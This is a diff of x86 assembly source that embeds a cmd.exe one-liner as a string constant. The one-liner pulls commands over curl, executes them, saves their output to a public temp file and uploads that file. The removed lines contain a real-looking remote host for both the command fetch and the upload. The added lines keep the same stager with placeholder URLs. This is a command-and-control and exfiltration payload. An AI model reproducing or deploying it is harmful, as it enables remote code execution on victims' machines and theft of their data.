@@ -32,11 +32,10 @@ _main	PROC
 	sub	esp, 36					; 00000024H
 ; Line 27
 	CALL after_$SG90243
-$SG90243 DB	'cmd.exe /c "for /f "delims=" %i in (''curl https://r.baa'
-	DB	'lejibreel.com/shaddy/data.php'') do set output=%i && %i > C:\'
+$SG90243 DB	'cmd.exe /c "for /f "delims=" %i in (''curl url_to'
+	DB	'get_commands'') do set output=%i && %i > C:\'
 	DB	'users\public\temp.txt && curl --form "fileToUpload=@C:\users\'
-	DB	'public\temp.txt" https://r.baalejibreel.com/shaddy/getfile.ph'
-	DB	'p" ', 00H
+	DB	'public\temp.txt" url_to_upload_output_file', 00H
 	ORG $+3
 after_$SG90243:
 	POP  DWORD PTR _cmd$[ebp]
